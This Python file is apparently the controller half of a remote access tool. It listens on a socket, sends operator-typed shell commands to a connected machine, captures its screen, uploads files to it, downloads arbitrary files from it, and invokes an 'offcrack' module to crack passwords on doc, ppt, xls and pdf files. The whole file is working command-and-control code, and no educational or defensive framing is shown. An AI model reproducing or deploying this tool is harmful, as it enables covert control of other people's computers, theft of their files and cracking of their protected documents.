# coding=utf-8
from socket import *
import random
import struct
import json
import os
import offcrack
bind_ip = '192.168.241.133'
bind_port = 9999
download_dir = os.getcwd()
s = socket(AF_INET, SOCK_STREAM)
s.bind((bind_ip, bind_port))
s.listen(10)
def recccc():
    obj = client.recv(4)
    header_size = struct.unpack('i', obj)[0]
    header_bytes = client.recv(header_size)
    header_json = header_bytes.decode('utf-8')
    header_dic = json.loads(header_json)
    print(header_dic)
    total_size = header_dic['file_size']
    file_name = header_dic['filename']
    with open('%s/%s' % (download_dir, file_name), 'wb') as f:
        recv_size = 0
        while recv_size < total_size:
            res = client.recv(1024)
            f.write(res)
            recv_size += len(res)
            print('总大小：%s  已经下载大小：%s' % (total_size, recv_size))

def send_win(share_dir,filename):
    
    header_dic = {
        'filename': filename,
        'file_size': os.path.getsize(r'%s/%s' % (share_dir, filename)) 
    }
    header_json = json.dumps(header_dic)
    header_bytes = header_json.encode('utf-8')
    client.send(struct.pack('i', len(header_bytes)))
    client.send(header_bytes)
    with open('%s/%s' % (share_dir, filename), 'rb') as f:
        for a in f:
            client.send(a)

def send_lin(share_dir,filename):
    header_dic = {
        'filename': filename,
        'file_size': os.path.getsize(r'%s/%s' % (share_dir, filename)) 
    }
    header_json = json.dumps(header_dic)
    header_bytes = header_json.encode('utf-8')
    client.send(struct.pack('i', len(header_bytes)))
    client.send(header_bytes)
    with open('%s/%s' % (share_dir, filename), 'rb') as f:
        for a in f:
            client.send(a)

print("[*] Listening on %s:%d"%(bind_ip,bind_port))

while True:
    client,addr = s.accept()
    while True:
        command = input("Enter shell command or quit:")
        client.send(command.encode())

        if command == "screen":
            recccc()

        elif command == "upload":
            ff = input("Enter your filepath you want to upload(/usr/bin/  D:\pic\):")
            bb = input("Enter your filename you want to upload(1.jpg):")
            if os.name == "posix":
                send_lin(ff,bb)
            else:
                send_win(ff,bb)
        elif command == "download":
            ff = input("Enter filepath you want to download:")
            bb = input("Enter your filename you want to download(1.jpg):")
            client.send(ff.encode())
            client.send(bb.encode())
            recccc()
        elif command == "crack":
            filena = input("filename:")
            passna = input("passname:")
            ttype = input("doc or ppt or xls or pdf:")
            offcrack.ccrack(filena,passna,ttype)
        elif command == "quit": break
        else:
            request = client.recv(1024).decode()
            print("[*] Received:%s"%request)
client.close()
